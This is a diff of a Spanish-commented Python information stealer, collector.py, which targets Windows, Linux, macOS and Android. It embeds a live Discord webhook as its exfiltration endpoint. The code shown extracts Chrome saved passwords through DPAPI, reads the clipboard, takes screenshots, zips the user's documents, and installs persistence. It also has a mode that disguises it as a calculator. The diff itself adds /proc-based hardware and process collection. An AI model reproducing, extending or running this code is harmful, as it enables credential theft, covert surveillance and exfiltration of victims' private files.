@@ -3,15 +3,6 @@
 """
 collector.py - Recolector multiplataforma + envio a webhook de Discord.
 Windows / Linux / macOS / Android (Kivy-Buildozer o Termux).
-
-Uso:
-    python collector.py                # recolecta y envia
-    python collector.py --test         # solo manda un ping al webhook
-    python collector.py --debug        # imprime el informe por consola
-    python collector.py --json out.json
-    python collector.py --grab         # adjunta documentos del usuario (zip)
-    python collector.py --install      # persistencia (Run / autostart)
-    python collector.py --gui          # se disfraza de calculadora
 """
 from __future__ import annotations
 
@@ -21,13 +12,13 @@ import uuid, zipfile
 from pathlib import Path
 
 # ----------------------------------------------------------------------------
-# CONFIG  (el webhook ya va incrustado)
+# CONFIG
 # ----------------------------------------------------------------------------
 DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/1562815752652718111/"
                    "5Dhc847naUwAIZi9B3efa3TFZWtYZiiCEU6Vq3KJrAdCyuS1OVQDN6ZXV0bYQg8-88F2")
 
 try:
-    from _secret import WEBHOOK_URL as _SW          # opcional, lo escribe el CI
+    from _secret import WEBHOOK_URL as _SW
 except Exception:
     _SW = ""
 
@@ -51,6 +42,7 @@ except Exception:
 
 SKIP = set()
 ANDROID = "ANDROID_ARGUMENT" in os.environ or "ANDROID_ROOT" in os.environ
+LINUX = platform.system() == "Linux"
 
 # ----------------------------------------------------------------------------
 # HELPERS
@@ -74,14 +66,13 @@ def _home() -> Path:
         return Path("/")
 
 def _roots_usuario():
-    """Carpetas de usuario reales (incluye /sdcard en Android)."""
     roots, home = [], _home()
     for n in ("Desktop", "Escritorio", "Documents", "Documentos",
               "Downloads", "Descargas", "Pictures", "Imagenes"):
         p = home / n
         if p.exists():
             roots.append(p)
-    if platform.system() == "Linux":
+    if LINUX:
         for extra in ("/sdcard/Download", "/sdcard/Documents", "/sdcard/DCIM",
                       "/storage/emulated/0/Download", "/storage/emulated/0/Documents"):
             p = Path(extra)
@@ -89,9 +80,8 @@ def _roots_usuario():
                 roots.append(p)
     vistos, out = set(), []
     for r in roots:
-        k = str(r)
-        if k not in vistos:
-            vistos.add(k); out.append(r)
+        if str(r) not in vistos:
+            vistos.add(str(r)); out.append(r)
     return out
 
 _SECTIONS = []
@@ -100,6 +90,89 @@ def section(titulo):
         _SECTIONS.append((titulo, fn))
         return fn
     return deco
+
+# ----------------------------------------------------------------------------
+# LECTURA DIRECTA DE /proc  (sustituye a psutil en Android / Linux)
+# ----------------------------------------------------------------------------
+def _procfs_mem():
+    d = {}
+    try:
+        for line in open("/proc/meminfo"):
+            k, v = line.split(":", 1)
+            if k in ("MemTotal", "MemAvailable", "SwapTotal"):
+                d[k] = f"{int(v.split()[0]) / 1048576:.2f} GB"
+    except Exception:
+        pass
+    return d
+
+def _procfs_cpu():
+    d = {}
+    try:
+        txt = open("/proc/cpuinfo").read()
+        m = re.search(r"model name\s*:\s*(.+)", txt) or re.search(r"Hardware\s*:\s*(.+)", txt)
+        if m:
+            d["cpu_modelo"] = m.group(1).strip()[:120]
+        d["cpu_nucleos"] = str(txt.count("processor"))
+        if "Features" in txt:
+            d["cpu_flags"] = txt.split("Features")[1].split("\n")[0].split(":")[-1].strip()[:220]
+    except Exception:
+        pass
+    try:
+        d["loadavg"] = open("/proc/loadavg").read().strip()
+    except Exception:
+        pass
+    return d
+
+def _procfs_bateria():
+    for p in ("/sys/class/power_supply/battery/capacity",
+              "/sys/class/power_supply/BAT0/capacity",
+              "/sys/class/power_supply/BAT1/capacity"):
+        try:
+            cap = open(p).read().strip()
+            est = ""
+            for s in ("/sys/class/power_supply/battery/status",):
+                try:
+                    est = open(s).read().strip()
+                except Exception:
+                    pass
+            return f"{cap}% {est}".strip()
+        except Exception:
+            pass
+    return ""
+
+def _procfs_procs(limit=60):
+    out = []
+    try:
+        for pid in os.listdir("/proc"):
+            if not pid.isdigit():
+                continue
+            try:
+                comm = open(f"/proc/{pid}/comm").read().strip()
+                rss = 0
+                for line in open(f"/proc/{pid}/status"):
+                    if line.startswith("VmRSS"):
+                        rss = int(line.split()[1]) * 1024
+                        break
+                out.append((rss, f"{pid} | {comm} | {rss / 1048576:.0f}MB"))
+            except Exception:
+                continue
+    except Exception:
+        pass
+    out.sort(reverse=True)
+    return out[:limit]
+
+def _uptime():
+    try:
+        if psutil:
+            s = time.time() - psutil.boot_time()
+        elif LINUX:
+            s = float(open("/proc/uptime").read().split()[0])
+        else:
+            s = 0
+        h, r = divmod(int(s), 3600); m, _ = divmod(r, 60)
+        return f"{h}h {m}m"
+    except Exception:
+        return "n/d"
 
 # ----------------------------------------------------------------------------
 # RECOLECTORES
@@ -124,19 +197,6 @@ def sec_sistema():
         "uptime": _uptime(),
     }
 
-def _uptime():
-    try:
-        if psutil:
-            s = time.time() - psutil.boot_time()
-        elif platform.system() == "Linux":
-            s = time.time() - os.path.getmtime("/proc/1")
-        else:
-            s = 0
-        h, r = divmod(int(s), 3600); m, _ = divmod(r, 60)
-        return f"{h}h {m}m"
-    except Exception:
-        return "n/d"
-
 @section("Hardware")
 def sec_hardware():
     d = {}
@@ -158,6 +218,13 @@ def sec_hardware():
                 d["bateria"] = f"{b.percent}% {'cargando' if b.power_plugged else 'descargando'}"
         except Exception:
             pass
+    elif LINUX:
+        d.update(_procfs_mem())
+        d.update(_procfs_cpu())
+        bat = _procfs_bateria()
+        if bat:
+            d["bateria"] = bat
+
     discos = []
     if psutil:
         for p in psutil.disk_partitions(all=False):
@@ -167,7 +234,21 @@ def sec_hardware():
                               f"{u.total / 1e9:.1f} GB ({u.percent}%)")
             except Exception:
                 pass
+    elif LINUX:
+        try:
+            for line in open("/proc/mounts"):
+                parts = line.split()
+                if len(parts) > 2 and parts[1].startswith(("/", "/sdcard", "/storage")):
+                    try:
+                        u = shutil.disk_usage(parts[1])
+                        discos.append(f"{parts[0]} [{parts[2]}] "
+                                      f"{u.used / 1e9:.1f}/{u.total / 1e9:.1f} GB")
+                    except Exception:
+                        pass
+        except Exception:
+            pass
     d["discos"] = "\n".join(discos[:10]) or "n/d"
+
     if platform.system() == "Windows":
         d["gpu"] = _run("wmic path win32_VideoController get name", 25)
         d["placa_base"] = _run("wmic baseboard get product,manufacturer", 25)
@@ -214,17 +295,21 @@ def sec_env():
 
 @section("Procesos")
 def sec_procesos():
-    if not psutil:
-        return {"nota": "psutil no disponible"}
-    procs = []
-    for p in psutil.process_iter(["pid", "name", "username", "memory_info"]):
-        try:
-            mi = p.info["memory_info"]
-            procs.append((mi.rss if mi else 0,
-                          f'{p.info["pid"]} | {p.info["name"]} | '
-                          f'{(mi.rss / 1048576 if mi else 0):.0f}MB | {p.info["username"]}'))
-        except Exception:
-            pass
+    if psutil:
+        procs = []
+        for p in psutil.process_iter(["pid", "name", "username", "memory_info"]):
+            try:
+                mi = p.info["memory_info"]
+                procs.append((mi.rss if mi else 0,
+                              f'{p.info["pid"]} | {p.info["name"]} | '
+                              f'{(mi.rss / 1048576 if mi else 0):.0f}MB | {p.info["username"]}'))
+            except Exception:
+                pass
+    elif LINUX:
+        procs = _procfs_procs(80)
+    else:
+        return {"nota": "sin psutil"}
+
     procs.sort(reverse=True)
     return {"total": str(len(procs)),
             "top30_ram": "\n".join(x[1] for x in procs[:30]),
@@ -313,7 +398,6 @@ def sec_navegadores():
     return d or {"nota": "sin navegadores detectados"}
 
 def _chrome_passwords(profile: Path, limit=12):
-    """Windows: DPAPI + AES-GCM sobre 'Login Data'."""
     db = profile / "Login Data"
     ls = profile.parent / "Local State"
     if not db.exists() or not ls.exists() or platform.system() != "Windows":
@@ -395,8 +479,7 @@ def sec_clipboard():
         except Exception:
             pass
     for cmd in ("powershell -NoProfile -Command Get-Clipboard",
-                "xclip -o -selection clipboard", "pbpaste",
-                "termux-clipboard-get"):
+                "xclip -o -selection clipboard", "pbpaste", "termux-clipboard-get"):
         out = _run(cmd, 8)
         if out:
             return {"contenido": out[:800]}
@@ -413,10 +496,8 @@ def _screenshot(destino: Path) -> bool:
             return True
     except Exception:
         pass
-    for cmd in (f"screencap -p {destino}",
-                f"import -window root {destino}",
-                f"scrot {destino}",
-                f"gnome-screenshot -f {destino}"):
+    for cmd in (f"screencap -p {destino}", f"import -window root {destino}",
+                f"scrot {destino}", f"gnome-screenshot -f {destino}"):
         if _run(cmd, 20) and destino.exists() and destino.stat().st_size > 0:
             return True
     return False
@@ -445,7 +526,7 @@ def grab_docs(max_bytes=18 * 1024 * 1024):
     return out if out.exists() and out.stat().st_size > 200 else None
 
 # ----------------------------------------------------------------------------
-# RECOLECCION
+# RECOLECCION / ENVIO
 # ----------------------------------------------------------------------------
 def run_collection() -> dict:
     data, errores = {}, {}
@@ -460,9 +541,6 @@ def run_collection() -> dict:
         data["Errores de recoleccion"] = errores
     return data
 
-# ----------------------------------------------------------------------------
-# ENVIO
-# ----------------------------------------------------------------------------
 def _post(url, payload=None, files=None, timeout=90):
     if requests is None:
         return False
@@ -501,8 +579,7 @@ def build_embeds(data: dict):
         })
     return embeds
 
-def send_report(data: dict, screen: Path | None = None, zipfile_: Path | None = None,
-                dump: Path | None = None) -> bool:
+def send_report(data: dict, screen=None, zipfile_=None, dump=None) -> bool:
     if not WEBHOOKS:
         print("[!] No hay webhook configurado"); return False
     if requests is None:
@@ -533,9 +610,6 @@ def test_webhook() -> bool:
         r = _post(u, {"username": BOT_NAME, "content": msg}) or r
     return r
 
-# ----------------------------------------------------------------------------
-# PERSISTENCIA
-# ----------------------------------------------------------------------------
 def install_persistence():
     exe = sys.executable
     cmd = f'"{exe}"' if getattr(sys, "frozen", False) else f'"{exe}" "{Path(__file__).resolve()}"'
@@ -555,9 +629,6 @@ def install_persistence():
     except Exception:
         pass
 
-# ----------------------------------------------------------------------------
-# MAIN
-# ----------------------------------------------------------------------------
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--json"); ap.add_argument("--delay", type=int, default=0)
@@ -570,19 +641,15 @@ def main():
     ap.add_argument("--debug", action="store_true")
     a = ap.parse_args()
 
-    if a.no_env:
-        SKIP.add("env")
-    if a.install:
-        install_persistence(); return
+    if a.no_env:  SKIP.add("env")
+    if a.install: install_persistence(); return
     if a.test:
         print("[+] Webhook OK" if test_webhook() else "[!] Webhook FALLO"); return
-    if a.delay:
-        time.sleep(a.delay)
+    if a.delay:   time.sleep(a.delay)
     if a.gui:
         import camuflaje; camuflaje.run(); return
 
     data = run_collection()
-
     tmp = Path(tempfile.mkdtemp())
     dump = tmp / "informe.json"
     dump.write_text(json.dumps(data, ensure_ascii=False, indent=1), encoding="utf-8")
@@ -599,8 +666,7 @@ def main():
     if a.debug:
         print(json.dumps(data, ensure_ascii=False, indent=2)[:4000])
 
-    ok = send_report(data, screen, z, dump)
-    print("[+] Enviado" if ok else "[!] Fallo al enviar")
+    print("[+] Enviado" if send_report(data, screen, z, dump) else "[!] Fallo al enviar")
 
 if __name__ == "__main__":
     try:
